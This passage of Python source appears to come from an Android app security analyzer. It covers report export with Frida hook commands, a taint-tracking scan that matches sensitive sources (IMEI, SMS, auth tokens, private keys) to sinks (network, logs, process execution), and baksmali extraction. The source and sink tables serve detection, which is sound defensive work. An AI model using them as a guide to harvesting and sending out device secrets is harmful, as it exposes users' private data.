                    doc.add_paragraph()
                
                if dynamic_analysis.get('frida_attach_command'):
                    p = doc.add_paragraph()
                    p.add_run("Attach Mode").bold = True
                    p.add_run(" (hooks running app):")
                    
                    cmd_p = doc.add_paragraph()
                    cmd_run = cmd_p.add_run(dynamic_analysis['frida_attach_command'])
                    cmd_run.font.name = 'Courier New'
                    cmd_run.font.size = Pt(9)
                    doc.add_paragraph()
            
            # Scripts List
            scripts = dynamic_analysis.get('frida_scripts', [])
            if scripts:
                doc.add_heading(f'Available Scripts ({len(scripts)} total)', 2)
                
                scripts_table = doc.add_table(rows=len(scripts) + 1, cols=3)
                scripts_table.style = 'Table Grid'
                
                # Header row
                scripts_table.rows[0].cells[0].text = "Script Name"
                scripts_table.rows[0].cells[1].text = "Category"
                scripts_table.rows[0].cells[2].text = "Description"
                
                for i, script in enumerate(scripts, 1):
                    scripts_table.rows[i].cells[0].text = script.get('name', 'Unknown')
                    scripts_table.rows[i].cells[1].text = script.get('category', 'general')
                    desc = script.get('description', 'No description')
                    scripts_table.rows[i].cells[2].text = desc[:80] + ("..." if len(desc) > 80 else "")
                
                doc.add_paragraph()
                note_p = doc.add_paragraph()
                note_run = note_p.add_run("Note: Full script code is available in the Markdown export or web interface.")
                note_run.italic = True
        
        # ==================== AI DIAGRAMS ====================
        if ai_architecture_diagram or ai_attack_surface_map:
            doc.add_page_break()
            doc.add_heading('AI-Generated Diagrams', 1)
            doc.add_paragraph(
                "The following Mermaid diagrams are included in this analysis. To view them as rendered graphics, "
                "use the Markdown export or view the diagrams in the web interface."
            )
            
            if ai_architecture_diagram:
                doc.add_heading('Application Architecture Diagram', 2)
                doc.add_paragraph(
                    "This diagram shows the architecture of the application including components, "
                    "services, and their interactions."
                )
                # Include first 500 chars of Mermaid code
                diagram_preview = ai_architecture_diagram[:500] + ("..." if len(ai_architecture_diagram) > 500 else "")
                p = doc.add_paragraph()
                code_run = p.add_run(diagram_preview)
                code_run.font.name = 'Courier New'
                code_run.font.size = Pt(8)
            
            if ai_attack_surface_map:
                doc.add_heading('Attack Surface Map', 2)
                doc.add_paragraph(
                    "This diagram maps potential attack vectors, entry points, and security-critical components."
                )
                # Include first 500 chars of Mermaid code
                diagram_preview = ai_attack_surface_map[:500] + ("..." if len(ai_attack_surface_map) > 500 else "")
                p = doc.add_paragraph()
                code_run = p.add_run(diagram_preview)
                code_run.font.name = 'Courier New'
                code_run.font.size = Pt(8)
        
        buffer = io.BytesIO()
        doc.save(buffer)
        return buffer.getvalue()
        
    except ImportError as e:
        logger.error(f"DOCX generation failed - missing dependency: {e}")
        raise RuntimeError("Word export requires python-docx. Install with: pip install python-docx")


# Import datetime at the top level if not already
from datetime import datetime


# ============================================================================
# DATA FLOW ANALYSIS - Taint Tracking for Android Apps
# ============================================================================

@dataclass
class TaintSource:
    """A source of sensitive/tainted data."""
    source_type: str  # "user_input", "device_info", "sensor", "location", "contacts", etc.
    class_name: str
    method_name: str
    description: str
    sensitivity: str  # "low", "medium", "high", "critical"
    owasp_category: str  # M1-M10 mapping


@dataclass
class TaintSink:
    """A sink where tainted data flows to."""
    sink_type: str  # "network", "storage", "log", "ipc", "sms", etc.
    class_name: str
    method_name: str
    description: str
    risk_level: str  # "low", "medium", "high", "critical"
    owasp_category: str


@dataclass
class DataFlowPath:
    """A path from source to sink."""
    source: TaintSource
    sink: TaintSink
    intermediate_methods: List[str]  # Methods in the call chain
    affected_class: str
    affected_method: str
    tainted_variable: Optional[str]
    code_snippet: str
    severity: str
    description: str
    recommendation: str


@dataclass
class DataFlowAnalysisResult:
    """Complete data flow analysis result."""
    total_sources: int
    total_sinks: int
    total_flows: int
    critical_flows: int
    high_risk_flows: int
    sources_found: List[Dict[str, Any]]
    sinks_found: List[Dict[str, Any]]
    data_flow_paths: List[DataFlowPath]
    privacy_violations: List[Dict[str, Any]]
    data_leak_risks: List[Dict[str, Any]]
    summary: str
    recommendations: List[str]


# Android API Sources - Where sensitive data enters the app
ANDROID_SOURCES = {
    # Location Sources
    "location": [
        ("Landroid/location/LocationManager;", "getLastKnownLocation", "Last known device location", "critical"),
        ("Landroid/location/LocationManager;", "requestLocationUpdates", "Real-time location tracking", "critical"),
        ("Lcom/google/android/gms/location/FusedLocationProviderClient;", "getLastLocation", "Google Play location", "critical"),
        ("Lcom/google/android/gms/location/FusedLocationProviderClient;", "requestLocationUpdates", "Google Play location updates", "critical"),
    ],
    # Device/Hardware ID Sources
    "device_info": [
        ("Landroid/telephony/TelephonyManager;", "getDeviceId", "Device IMEI/MEID (deprecated)", "critical"),
        ("Landroid/telephony/TelephonyManager;", "getImei", "Device IMEI", "critical"),
        ("Landroid/telephony/TelephonyManager;", "getMeid", "Device MEID", "critical"),
        ("Landroid/telephony/TelephonyManager;", "getLine1Number", "Phone number", "critical"),
        ("Landroid/telephony/TelephonyManager;", "getSimSerialNumber", "SIM serial number", "critical"),
        ("Landroid/telephony/TelephonyManager;", "getSubscriberId", "IMSI (subscriber ID)", "critical"),
        ("Landroid/provider/Settings$Secure;", "getString", "Android ID/Secure settings", "high"),
        ("Landroid/os/Build;", "SERIAL", "Hardware serial (deprecated)", "high"),
        ("Landroid/net/wifi/WifiInfo;", "getMacAddress", "WiFi MAC address", "high"),
        ("Landroid/bluetooth/BluetoothAdapter;", "getAddress", "Bluetooth MAC address", "high"),
    ],
    # User Input Sources
    "user_input": [
        ("Landroid/widget/EditText;", "getText", "Text input from user", "medium"),
        ("Landroid/widget/TextView;", "getText", "Text content", "low"),
        ("Landroid/content/Intent;", "getStringExtra", "Intent string data", "medium"),
        ("Landroid/content/Intent;", "getExtras", "Intent bundle data", "medium"),
        ("Landroid/content/Intent;", "getData", "Intent URI data", "medium"),
        ("Landroid/webkit/WebView;", "getUrl", "WebView URL", "medium"),
    ],
    # Contacts Sources
    "contacts": [
        ("Landroid/content/ContentResolver;", "query", "Content provider query (contacts, calendar, etc.)", "high"),
        ("Landroid/provider/ContactsContract;", "CONTENT_URI", "Contacts database access", "critical"),
        ("Landroid/provider/CalendarContract;", "CONTENT_URI", "Calendar database access", "high"),
    ],
    # Camera/Media Sources
    "media": [
        ("Landroid/hardware/Camera;", "takePicture", "Camera capture", "high"),
        ("Landroid/hardware/camera2/CameraCaptureSession;", "capture", "Camera2 capture", "high"),
        ("Landroid/media/MediaRecorder;", "start", "Audio/Video recording", "critical"),
        ("Landroid/media/AudioRecord;", "read", "Microphone audio data", "critical"),
    ],
    # SMS Sources
    "sms": [
        ("Landroid/telephony/SmsManager;", "getAllMessagesFromIcc", "ICC SMS messages", "critical"),
        ("Landroid/provider/Telephony$Sms;", "CONTENT_URI", "SMS database", "critical"),
    ],
    # Account Sources
    "accounts": [
        ("Landroid/accounts/AccountManager;", "getAccounts", "User accounts", "high"),
        ("Landroid/accounts/AccountManager;", "getAccountsByType", "Accounts by type", "high"),
        ("Landroid/accounts/AccountManager;", "peekAuthToken", "Auth tokens", "critical"),
    ],
    # Clipboard
    "clipboard": [
        ("Landroid/content/ClipboardManager;", "getPrimaryClip", "Clipboard content", "medium"),
        ("Landroid/content/ClipboardManager;", "getText", "Clipboard text", "medium"),
    ],
    # File System
    "file_system": [
        ("Ljava/io/FileInputStream;", "<init>", "File read", "medium"),
        ("Ljava/io/BufferedReader;", "readLine", "File line read", "medium"),
        ("Landroid/content/SharedPreferences;", "getString", "SharedPrefs read", "medium"),
        ("Landroid/content/SharedPreferences;", "getAll", "All SharedPrefs", "high"),
    ],
    # Network Responses
    "network_response": [
        ("Ljava/net/HttpURLConnection;", "getInputStream", "HTTP response", "medium"),
        ("Lokhttp3/Response;", "body", "OkHttp response body", "medium"),
        ("Lretrofit2/Response;", "body", "Retrofit response body", "medium"),
    ],
    # Crypto Keys
    "crypto": [
        ("Ljavax/crypto/SecretKey;", "getEncoded", "Secret key bytes", "critical"),
        ("Ljava/security/PrivateKey;", "getEncoded", "Private key bytes", "critical"),
        ("Landroid/security/keystore/KeyGenParameterSpec;", "Builder", "Keystore key generation", "high"),
    ],
}

# Android API Sinks - Where data exits or is stored
ANDROID_SINKS = {
    # Network Sinks
    "network": [
        ("Ljava/net/HttpURLConnection;", "getOutputStream", "HTTP request output", "high"),
        ("Ljava/net/HttpURLConnection;", "connect", "HTTP connection", "medium"),
        ("Lokhttp3/OkHttpClient;", "newCall", "OkHttp request", "high"),
        ("Lokhttp3/RequestBody;", "create", "OkHttp request body", "high"),
        ("Lretrofit2/Call;", "execute", "Retrofit sync request", "high"),
        ("Lretrofit2/Call;", "enqueue", "Retrofit async request", "high"),
        ("Ljava/net/Socket;", "getOutputStream", "Socket output", "high"),
        ("Landroid/webkit/WebView;", "loadUrl", "WebView URL load", "medium"),
        ("Landroid/webkit/WebView;", "postUrl", "WebView POST", "high"),
        ("Landroid/webkit/WebView;", "evaluateJavascript", "WebView JS execution", "high"),
    ],
    # Storage Sinks
    "storage": [
        ("Ljava/io/FileOutputStream;", "write", "File write", "medium"),
        ("Ljava/io/BufferedWriter;", "write", "Buffered file write", "medium"),
        ("Landroid/content/SharedPreferences$Editor;", "putString", "SharedPrefs write", "medium"),
        ("Landroid/content/SharedPreferences$Editor;", "commit", "SharedPrefs commit", "medium"),
        ("Landroid/database/sqlite/SQLiteDatabase;", "insert", "SQLite insert", "medium"),
        ("Landroid/database/sqlite/SQLiteDatabase;", "execSQL", "SQLite raw query", "high"),
        ("Landroid/database/sqlite/SQLiteDatabase;", "rawQuery", "SQLite raw query", "medium"),
    ],
    # Logging Sinks (data leak risk)
    "logging": [
        ("Landroid/util/Log;", "d", "Debug log", "medium"),
        ("Landroid/util/Log;", "v", "Verbose log", "low"),
        ("Landroid/util/Log;", "i", "Info log", "low"),
        ("Landroid/util/Log;", "w", "Warning log", "medium"),
        ("Landroid/util/Log;", "e", "Error log", "medium"),
        ("Ljava/io/PrintStream;", "println", "System.out.println", "medium"),
    ],
    # IPC Sinks (sending to other apps)
    "ipc": [
        ("Landroid/content/Context;", "sendBroadcast", "Send broadcast", "high"),
        ("Landroid/content/Context;", "sendOrderedBroadcast", "Send ordered broadcast", "high"),
        ("Landroid/content/Context;", "startActivity", "Start activity", "medium"),
        ("Landroid/content/Context;", "startService", "Start service", "medium"),
        ("Landroid/content/Intent;", "putExtra", "Intent data attachment", "medium"),
        ("Landroid/content/ContentResolver;", "insert", "Content provider insert", "medium"),
        ("Landroid/content/ContentResolver;", "update", "Content provider update", "medium"),
    ],
    # SMS Sinks
    "sms": [
        ("Landroid/telephony/SmsManager;", "sendTextMessage", "Send SMS", "critical"),
        ("Landroid/telephony/SmsManager;", "sendMultipartTextMessage", "Send multipart SMS", "critical"),
        ("Landroid/telephony/SmsManager;", "sendDataMessage", "Send data SMS", "critical"),
    ],
    # Clipboard Sinks
    "clipboard": [
        ("Landroid/content/ClipboardManager;", "setPrimaryClip", "Set clipboard", "medium"),
    ],
    # External Storage
    "external_storage": [
        ("Landroid/os/Environment;", "getExternalStorageDirectory", "External storage write", "high"),
        ("Landroid/os/Environment;", "getExternalStoragePublicDirectory", "Public external storage", "high"),
    ],
    # Process Execution (command injection risk)
    "process_execution": [
        ("Ljava/lang/Runtime;", "exec", "Runtime command execution", "critical"),
        ("Ljava/lang/ProcessBuilder;", "start", "Process execution", "critical"),
    ],
    # Reflection (potential security bypass)
    "reflection": [
        ("Ljava/lang/reflect/Method;", "invoke", "Reflective method call", "high"),
        ("Ljava/lang/Class;", "forName", "Dynamic class loading", "medium"),
        ("Ldalvik/system/DexClassLoader;", "loadClass", "DEX class loading", "critical"),
    ],
    # Native Code
    "native": [
        ("Ljava/lang/System;", "loadLibrary", "Load native library", "medium"),
        ("Ljava/lang/System;", "load", "Load native library path", "medium"),
    ],
}

# Privacy-sensitive data categories for GDPR/privacy compliance
PRIVACY_DATA_CATEGORIES = {
    "PII": ["device_info", "contacts", "accounts", "location"],
    "Financial": ["accounts", "clipboard"],
    "Health": ["sensor"],
    "Biometric": ["media"],
    "Communication": ["sms", "contacts"],
    "Behavioral": ["location", "user_input"],
}


def analyze_data_flow(file_path: Path, package_name: str = None) -> DataFlowAnalysisResult:
    """
    Perform comprehensive data flow analysis on an APK.
    
    Identifies:
    1. Sources of sensitive data (location, device ID, contacts, etc.)
    2. Sinks where data exits (network, storage, logs, etc.)
    3. Paths from sources to sinks (potential data leaks)
    4. Privacy violations (PII being sent to network)
    
    Args:
        file_path: Path to the APK file
        package_name: Optional package name to focus analysis on app code
        
    Returns:
        DataFlowAnalysisResult with complete analysis
    """
    sources_found = []
    sinks_found = []
    data_flow_paths = []
    privacy_violations = []
    data_leak_risks = []
    
    if not ANDROGUARD_AVAILABLE:
        return DataFlowAnalysisResult(
            total_sources=0,
            total_sinks=0,
            total_flows=0,
            critical_flows=0,
            high_risk_flows=0,
            sources_found=[],
            sinks_found=[],
            data_flow_paths=[],
            privacy_violations=[],
            data_leak_risks=[],
            summary="Androguard not available for data flow analysis",
            recommendations=["Install androguard for data flow analysis"],
        )
    
    try:
        from androguard.core.dex import DEX
        
        # Track method calls and their contexts
        method_calls = {}  # method -> list of (callee_class, callee_method)
        source_locations = []  # List of (class, method, source_type, details)
        sink_locations = []  # List of (class, method, sink_type, details)
        
        with zipfile.ZipFile(file_path, 'r') as zf:
            dex_files = [n for n in zf.namelist() if n.endswith('.dex')]
            
            for dex_name in dex_files:
                try:
                    dex_data = zf.read(dex_name)
                    dex = DEX(dex_data)
                    
                    for cls in dex.get_classes():
                        class_name = cls.get_name()
                        readable_class = class_name.replace('/', '.').strip('L;')
                        
                        # Focus on app code if package name provided
                        if package_name:
                            # Include app package and common library patterns
                            if not any(pattern in readable_class for pattern in [
                                package_name.replace('.', '/'),
                                package_name,
                                # Include common libraries that might be interesting
                                'retrofit', 'okhttp', 'volley', 'apache.http',
                            ]):
                                # Skip Android framework and other libraries
                                if readable_class.startswith(('android.', 'androidx.', 'java.', 'kotlin.', 'com.google.')):
                                    continue
                        
                        for method in cls.get_methods():
                            method_name = method.get_name()
                            method_desc = method.get_descriptor()
                            full_method = f"{readable_class}.{method_name}"
                            
                            code = method.get_code()
                            if not code:
                                continue
                            
                            # Get bytecode instructions
                            bc = code.get_bc() if hasattr(code, 'get_bc') else None
                            if not bc:
                                continue
                            
                            method_sources = []
                            method_sinks = []
                            instruction_context = []
                            
                            for ins in bc.get_instructions():
                                ins_name = ins.get_name()
                                ins_output = ins.get_output() if hasattr(ins, 'get_output') else ""
                                instruction_context.append(f"{ins_name} {ins_output}")
                                
                                # Check for invoke instructions (method calls)
                                if 'invoke' in ins_name.lower():
                                    # Parse the called method
                                    called_info = _parse_invoke_instruction(ins_output)
                                    if called_info:
                                        callee_class, callee_method = called_info
                                        
                                        # Check if it's a source
                                        source_match = _match_source(callee_class, callee_method)
                                        if source_match:
                                            source_type, description, sensitivity = source_match
                                            method_sources.append({
                                                "type": source_type,
                                                "class": callee_class,
                                                "method": callee_method,
                                                "description": description,
                                                "sensitivity": sensitivity,
                                                "instruction": f"{ins_name} {ins_output}",
                                            })
                                            source_locations.append((readable_class, method_name, source_type, source_match))
                                        
                                        # Check if it's a sink
                                        sink_match = _match_sink(callee_class, callee_method)
                                        if sink_match:
                                            sink_type, description, risk_level = sink_match
                                            method_sinks.append({
                                                "type": sink_type,
                                                "class": callee_class,
                                                "method": callee_method,
                                                "description": description,
                                                "risk_level": risk_level,
                                                "instruction": f"{ins_name} {ins_output}",
                                            })
                                            sink_locations.append((readable_class, method_name, sink_type, sink_match))
                            
                            # Record sources found
                            for src in method_sources:
                                sources_found.append({
                                    "source_type": src["type"],
                                    "class_name": readable_class,
                                    "method_name": method_name,
                                    "api_class": src["class"],
                                    "api_method": src["method"],
                                    "description": src["description"],
                                    "sensitivity": src["sensitivity"],
                                })
                            
                            # Record sinks found
                            for snk in method_sinks:
                                sinks_found.append({
                                    "sink_type": snk["type"],
                                    "class_name": readable_class,
                                    "method_name": method_name,
                                    "api_class": snk["class"],
                                    "api_method": snk["method"],
                                    "description": snk["description"],
                                    "risk_level": snk["risk_level"],
                                })
                            
                            # Detect potential data flows (source and sink in same method)
                            # This is a simplified intra-procedural analysis
                            if method_sources and method_sinks:
                                for src in method_sources:
                                    for snk in method_sinks:
                                        # Calculate severity based on source sensitivity and sink risk
                                        severity = _calculate_flow_severity(src["sensitivity"], snk["risk_level"])
                                        
                                        flow_path = DataFlowPath(
                                            source=TaintSource(
                                                source_type=src["type"],
                                                class_name=src["class"],
                                                method_name=src["method"],
                                                description=src["description"],
                                                sensitivity=src["sensitivity"],
                                                owasp_category=_get_owasp_category(src["type"], "source"),
                                            ),
                                            sink=TaintSink(
                                                sink_type=snk["type"],
                                                class_name=snk["class"],
                                                method_name=snk["method"],
                                                description=snk["description"],
                                                risk_level=snk["risk_level"],
                                                owasp_category=_get_owasp_category(snk["type"], "sink"),
                                            ),
                                            intermediate_methods=[],
                                            affected_class=readable_class,
                                            affected_method=method_name,
                                            tainted_variable=None,
                                            code_snippet='\n'.join(instruction_context[-10:]),
                                            severity=severity,
                                            description=f"{src['description']} may flow to {snk['description']}",
                                            recommendation=_get_flow_recommendation(src["type"], snk["type"]),
                                        )
                                        data_flow_paths.append(flow_path)
                                        
                                        # Check for privacy violations
                                        if src["type"] in ["device_info", "location", "contacts", "sms"]:
                                            if snk["type"] in ["network", "logging", "ipc"]:
                                                privacy_violations.append({
                                                    "violation_type": "PII_LEAKAGE",
                                                    "data_category": src["type"],
                                                    "destination": snk["type"],
                                                    "class": readable_class,
                                                    "method": method_name,
                                                    "severity": severity,
                                                    "description": f"Sensitive {src['type']} data may be sent to {snk['type']}",
                                                    "gdpr_relevant": True,
                                                    "recommendation": f"Ensure proper consent before sending {src['type']} data",
                                                })
                                        
                                        # Check for data leak risks
                                        if snk["type"] in ["logging", "external_storage"]:
                                            if src["sensitivity"] in ["high", "critical"]:
                                                data_leak_risks.append({
                                                    "risk_type": "DATA_EXPOSURE",
                                                    "data_sensitivity": src["sensitivity"],
                                                    "exposure_vector": snk["type"],
                                                    "class": readable_class,
                                                    "method": method_name,
                                                    "severity": severity,
                                                    "description": f"Sensitive data ({src['type']}) may be exposed via {snk['type']}",
                                                    "recommendation": f"Remove {snk['type']} of sensitive data in production",
                                                })
                                
                except Exception as e:
                    logger.warning(f"Data flow analysis failed for {dex_name}: {e}")
        
        # Calculate statistics
        critical_flows = sum(1 for p in data_flow_paths if p.severity == "critical")
        high_risk_flows = sum(1 for p in data_flow_paths if p.severity == "high")
        
        # Generate summary
        summary = _generate_flow_summary(sources_found, sinks_found, data_flow_paths, privacy_violations)
        
        # Generate recommendations
        recommendations = _generate_flow_recommendations(data_flow_paths, privacy_violations, data_leak_risks)
        
        return DataFlowAnalysisResult(
            total_sources=len(sources_found),
            total_sinks=len(sinks_found),
            total_flows=len(data_flow_paths),
            critical_flows=critical_flows,
            high_risk_flows=high_risk_flows,
            sources_found=sources_found,
            sinks_found=sinks_found,
            data_flow_paths=data_flow_paths,
            privacy_violations=privacy_violations,
            data_leak_risks=data_leak_risks,
            summary=summary,
            recommendations=recommendations,
        )
        
    except Exception as e:
        logger.error(f"Data flow analysis failed: {e}")
        return DataFlowAnalysisResult(
            total_sources=0,
            total_sinks=0,
            total_flows=0,
            critical_flows=0,
            high_risk_flows=0,
            sources_found=[],
            sinks_found=[],
            data_flow_paths=[],
            privacy_violations=[],
            data_leak_risks=[],
            summary=f"Analysis failed: {str(e)}",
            recommendations=[],
        )


def _parse_invoke_instruction(output: str) -> Optional[tuple]:
    """Parse invoke instruction to extract called class and method."""
    try:
        # Format: Lcom/example/Class;->methodName(params)ReturnType
        match = re.search(r'(L[^;]+;)->([^(]+)', output)
        if match:
            return match.group(1), match.group(2)
    except:
        pass
    return None


def _match_source(callee_class: str, callee_method: str) -> Optional[tuple]:
    """Match a method call against known sources."""
    for source_type, sources in ANDROID_SOURCES.items():
        for src_class, src_method, description, sensitivity in sources:
            if src_class in callee_class and src_method == callee_method:
                return source_type, description, sensitivity
    return None


def _match_sink(callee_class: str, callee_method: str) -> Optional[tuple]:
    """Match a method call against known sinks."""
    for sink_type, sinks in ANDROID_SINKS.items():
        for snk_class, snk_method, description, risk_level in sinks:
            if snk_class in callee_class and snk_method == callee_method:
                return sink_type, description, risk_level
    return None


def _calculate_flow_severity(source_sensitivity: str, sink_risk: str) -> str:
    """Calculate overall severity based on source sensitivity and sink risk."""
    severity_matrix = {
        ("critical", "critical"): "critical",
        ("critical", "high"): "critical",
        ("critical", "medium"): "high",
        ("critical", "low"): "high",
        ("high", "critical"): "critical",
        ("high", "high"): "high",
        ("high", "medium"): "high",
        ("high", "low"): "medium",
        ("medium", "critical"): "high",
        ("medium", "high"): "medium",
        ("medium", "medium"): "medium",
        ("medium", "low"): "low",
        ("low", "critical"): "medium",
        ("low", "high"): "medium",
        ("low", "medium"): "low",
        ("low", "low"): "low",
    }
    return severity_matrix.get((source_sensitivity, sink_risk), "medium")


def _get_owasp_category(data_type: str, flow_type: str) -> str:
    """Map data type to OWASP Mobile Top 10 category."""
    owasp_map = {
        # Sources
        "location": "M1: Improper Platform Usage",
        "device_info": "M1: Improper Platform Usage",
        "contacts": "M2: Insecure Data Storage",
        "sms": "M1: Improper Platform Usage",
        "user_input": "M3: Insecure Communication",
        "crypto": "M5: Insufficient Cryptography",
        "accounts": "M4: Insecure Authentication",
        # Sinks
        "network": "M3: Insecure Communication",
        "storage": "M2: Insecure Data Storage",
        "logging": "M2: Insecure Data Storage",
        "ipc": "M1: Improper Platform Usage",
        "external_storage": "M2: Insecure Data Storage",
        "process_execution": "M7: Client Code Quality",
        "reflection": "M8: Code Tampering",
    }
    return owasp_map.get(data_type, "M10: Extraneous Functionality")


def _get_flow_recommendation(source_type: str, sink_type: str) -> str:
    """Get recommendation for a specific source-to-sink flow."""
    recommendations = {
        ("location", "network"): "Ensure location data is transmitted over HTTPS with certificate pinning. Implement user consent before sharing location.",
        ("location", "logging"): "Remove location logging in production builds. Use debug-only logging guards.",
        ("device_info", "network"): "Do not send device identifiers without user consent. Consider using resettable advertising IDs instead.",
        ("device_info", "storage"): "Encrypt device identifiers before storing. Consider using Android Keystore for secure storage.",
        ("contacts", "network"): "Implement explicit user consent before syncing contacts. Use secure transmission (TLS 1.3).",
        ("user_input", "network"): "Validate and sanitize user input before transmission. Use HTTPS with certificate pinning.",
        ("user_input", "storage"): "Encrypt sensitive user data before storage. Use Android Keystore for keys.",
        ("crypto", "logging"): "Never log cryptographic keys or sensitive data. Remove all crypto logging.",
        ("accounts", "network"): "Use secure authentication protocols. Never transmit passwords in plain text.",
        ("sms", "network"): "Do not transmit SMS content without explicit user consent. Ensure compliance with privacy laws.",
    }
    return recommendations.get((source_type, sink_type), 
        f"Review data flow from {source_type} to {sink_type}. Ensure proper validation, encryption, and user consent.")


def _generate_flow_summary(sources, sinks, flows, violations) -> str:
    """Generate a human-readable summary of data flow analysis."""
    source_types = list(set(s["source_type"] for s in sources))
    sink_types = list(set(s["sink_type"] for s in sinks))
    
    summary_parts = []
    
    if flows:
        critical = sum(1 for f in flows if f.severity == "critical")
        high = sum(1 for f in flows if f.severity == "high")
        
        summary_parts.append(f"Found {len(flows)} potential data flows")
        if critical:
            summary_parts.append(f"including {critical} CRITICAL risk flows")
        if high:
            summary_parts.append(f"and {high} HIGH risk flows")
    else:
        summary_parts.append("No direct data flows detected between sources and sinks")
    
    if violations:
        summary_parts.append(f". Identified {len(violations)} potential privacy violations")
    
    if source_types:
        summary_parts.append(f". Sensitive data sources: {', '.join(source_types[:5])}")
    
    if sink_types:
        summary_parts.append(f". Data destinations: {', '.join(sink_types[:5])}")
    
    return ''.join(summary_parts) + "."


def _generate_flow_recommendations(flows, violations, leaks) -> List[str]:
    """Generate prioritized recommendations based on analysis."""
    recommendations = []
    seen = set()
    
    # Critical flow recommendations
    critical_flows = [f for f in flows if f.severity == "critical"]
    for flow in critical_flows[:5]:
        rec = flow.recommendation
        if rec not in seen:
            recommendations.append(f" CRITICAL: {rec}")
            seen.add(rec)
    
    # Privacy violation recommendations
    for violation in violations[:5]:
        rec = violation.get("recommendation", "")
        if rec and rec not in seen:
            recommendations.append(f" PRIVACY: {rec}")
            seen.add(rec)
    
    # Data leak recommendations
    for leak in leaks[:5]:
        rec = leak.get("recommendation", "")
        if rec and rec not in seen:
            recommendations.append(f" DATA LEAK: {rec}")
            seen.add(rec)
    
    # General recommendations
    if any(f.sink.sink_type == "logging" for f in flows):
        if "Remove sensitive data from logs" not in seen:
            recommendations.append(" Remove all sensitive data from logs before production release")
    
    if any(f.source.source_type == "device_info" for f in flows):
        if "device identifiers" not in ' '.join(seen).lower():
            recommendations.append(" Review device identifier usage for privacy compliance (GDPR, CCPA)")
    
    if any(f.sink.sink_type == "network" for f in flows):
        recommendations.append(" Implement certificate pinning for all network communications")
        recommendations.append(" Use TLS 1.3 for all data transmissions")
    
    return recommendations[:15]  # Limit to top 15


def dataflow_result_to_dict(result: DataFlowAnalysisResult) -> dict:
    """Convert DataFlowAnalysisResult to dictionary for JSON serialization."""
    return {
        "total_sources": result.total_sources,
        "total_sinks": result.total_sinks,
        "total_flows": result.total_flows,
        "critical_flows": result.critical_flows,
        "high_risk_flows": result.high_risk_flows,
        "sources_found": result.sources_found,
        "sinks_found": result.sinks_found,
        "data_flow_paths": [
            {
                "source": {
                    "type": p.source.source_type,
                    "class": p.source.class_name,
                    "method": p.source.method_name,
                    "description": p.source.description,
                    "sensitivity": p.source.sensitivity,
                },
                "sink": {
                    "type": p.sink.sink_type,
                    "class": p.sink.class_name,
                    "method": p.sink.method_name,
                    "description": p.sink.description,
                    "risk_level": p.sink.risk_level,
                },
                "affected_class": p.affected_class,
                "affected_method": p.affected_method,
                "severity": p.severity,
                "description": p.description,
                "recommendation": p.recommendation,
                "code_snippet": p.code_snippet,
            }
            for p in result.data_flow_paths
        ],
        "privacy_violations": result.privacy_violations,
        "data_leak_risks": result.data_leak_risks,
        "summary": result.summary,
        "recommendations": result.recommendations,
    }


# ============================================================================
# Smali View Functions
# ============================================================================

def get_smali_for_class(output_dir: Path, class_path: str) -> Optional[Dict[str, Any]]:
    """
    Get Smali bytecode for a specific class.
    
    Args:
        output_dir: JADX output directory
        class_path: Path to Java class file (e.g., "com/example/MainActivity.java")
    
    Returns:
        Dictionary with smali_code, class_info, and bytecode_analysis
    """
    # Convert Java path to Smali path
    # Java: sources/com/example/MainActivity.java
    # Smali would be in: sources/com/example/MainActivity.smali (if we decompiled with --show-bad-code)
    
    # First try to find smali from a separate baksmali run
    smali_dir = output_dir / "smali"
    
    # Convert class path to package path
    class_path_normalized = class_path.replace('.java', '').replace('/', '.')
    parts = class_path_normalized.split('.')
    class_name = parts[-1] if parts else ""
    package_path = '/'.join(parts[:-1]) if len(parts) > 1 else ""
    
    smali_file = None
    
    # Try multiple locations
    possible_paths = [
        smali_dir / f"{package_path}/{class_name}.smali",
        smali_dir / "classes" / f"{package_path}/{class_name}.smali",
        output_dir / "sources" / class_path.replace('.java', '.smali'),
    ]
    
    for path in possible_paths:
        if path.exists():
            smali_file = path
            break
    
    # If no pre-existing smali, try to generate from DEX
    if not smali_file or not smali_file.exists():
        # We need to run baksmali on the original APK/DEX
        # Check if we have the original APK path stored
        apk_path = output_dir / ".apk_path"
        
        if apk_path.exists():
            original_apk = Path(apk_path.read_text().strip())
            if original_apk.exists():
                smali_code = _extract_smali_from_apk(original_apk, class_path_normalized, output_dir)
                if smali_code:
                    return {
                        "class_path": class_path,
                        "smali_code": smali_code,
                        "bytecode_stats": _analyze_smali_bytecode(smali_code),
                        "registers_used": _count_registers(smali_code),
                        "method_count": smali_code.count(".method"),
                        "field_count": smali_code.count(".field"),
                        "instructions": _extract_smali_instructions(smali_code),
                    }
        
        # If no APK, try to generate pseudo-smali from Java
        java_source = get_jadx_class_source(output_dir, class_path)
        if java_source:
            return {
                "class_path": class_path,
                "smali_code": _generate_pseudo_smali(java_source, class_name),
                "bytecode_stats": {"note": "Pseudo-Smali generated from Java source"},
                "registers_used": 0,
                "method_count": java_source.count(" void ") + java_source.count(" int ") + java_source.count(" String "),
                "field_count": 0,
                "instructions": [],
                "is_pseudo": True,
            }
    
    if smali_file and smali_file.exists():
        smali_code = smali_file.read_text(encoding='utf-8', errors='ignore')
        return {
            "class_path": class_path,
            "smali_code": smali_code,
            "bytecode_stats": _analyze_smali_bytecode(smali_code),
            "registers_used": _count_registers(smali_code),
            "method_count": smali_code.count(".method"),
            "field_count": smali_code.count(".field"),
            "instructions": _extract_smali_instructions(smali_code),
        }
    
    return None


def _extract_smali_from_apk(apk_path: Path, class_name: str, output_dir: Path) -> Optional[str]:
    """Extract Smali for a specific class using baksmali."""
    import subprocess
    import zipfile
    
    try:
        # Create temp directory for smali output
        smali_out = output_dir / "smali"
        smali_out.mkdir(exist_ok=True)
        
        # Try to find dex file in APK
        with zipfile.ZipFile(apk_path, 'r') as apk:
            dex_files = [f for f in apk.namelist() if f.endswith('.dex')]
            
            if not dex_files:
                return None
            
            # Extract classes.dex
            for dex_name in dex_files:
                dex_path = output_dir / dex_name
                apk.extract(dex_name, output_dir)
                
                # Run baksmali
                try:
                    result = subprocess.run(
                        ["baksmali", "d", str(dex_path), "-o", str(smali_out)],
                        capture_output=True,
                        text=True,
                        timeout=60
                    )
                except FileNotFoundError:
                    # baksmali not installed, try dex2jar approach
                    logger.warning("baksmali not found, using fallback")
                    break
        
        # Find the smali file for our class
        class_path = class_name.replace('.', '/') + '.smali'
        smali_file = smali_out / class_path
        
        if smali_file.exists():
            return smali_file.read_text(encoding='utf-8', errors='ignore')
        
        # Try with inner classes
        for f in smali_out.rglob(f"*{class_name.split('.')[-1]}*.smali"):
            return f.read_text(encoding='utf-8', errors='ignore')
            
    except Exception as e:
